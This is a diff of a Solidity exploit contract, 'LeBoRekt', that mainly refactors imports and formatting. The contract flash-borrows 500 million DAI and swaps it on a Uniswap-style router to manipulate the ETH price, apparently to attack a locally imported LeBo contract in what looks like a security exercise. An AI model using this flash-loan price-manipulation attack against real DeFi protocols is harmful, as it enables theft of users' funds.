@@ -1,16 +1,16 @@
 //SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "./interfaces/IUniswapV2Router.sol";
-import "./interfaces/IERC3156FlashLender.sol";
-import "./interfaces/IERC3156FlashBorrower.sol";
-import "./interfaces/IERC20.sol";
-import "./LeBo.sol";
-import "hardhat/console.sol";
+import "@uniswap/periphery/contracts/interfaces/IUniswapV2Router02.sol";
+import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
+import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import "@uniswap/periphery/contracts/interfaces/IERC20.sol";
+import { LeBo } from "./LeBo.sol";
+import "forge-std/console.sol";
 
 contract LeBoRekt is IERC3156FlashBorrower {
     IERC3156FlashLender constant lender = IERC3156FlashLender(0x1EB4CF3A948E7D72A198fe073cCb8C7a948cD853);
-    IUniswapV2Router constant router = IUniswapV2Router(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
+    IUniswapV2Router02 constant router = IUniswapV2Router02(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
     IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
     IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     LeBo immutable lebo;
@@ -23,7 +23,7 @@ contract LeBoRekt is IERC3156FlashBorrower {
         lebo = _lebo;
     }
 
-    function rekt() public {      
+    function rekt() public {
         // Flash borrow 500m DAI
         lender.flashLoan(IERC3156FlashBorrower(this), address(DAI), uint256(500) * uint256(10)**6 * 1 ether, "");
 
@@ -40,19 +40,13 @@ contract LeBoRekt is IERC3156FlashBorrower {
         uint256,
         bytes calldata
     ) external override returns (bytes32) {
-        require(
-            msg.sender == address(lender),
-            "FlashBorrower: Untrusted lender"
-        );
-        require(
-            initiator == address(this),
-            "FlashBorrower: Untrusted loan initiator"
-        );
+        require(msg.sender == address(lender), "FlashBorrower: Untrusted lender");
+        require(initiator == address(this), "FlashBorrower: Untrusted loan initiator");
 
         address[] memory path = new address[](2);
         path[0] = address(DAI);
         path[1] = address(WETH);
-        
+
         // Manipulate price of ETH
         router.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp);
 
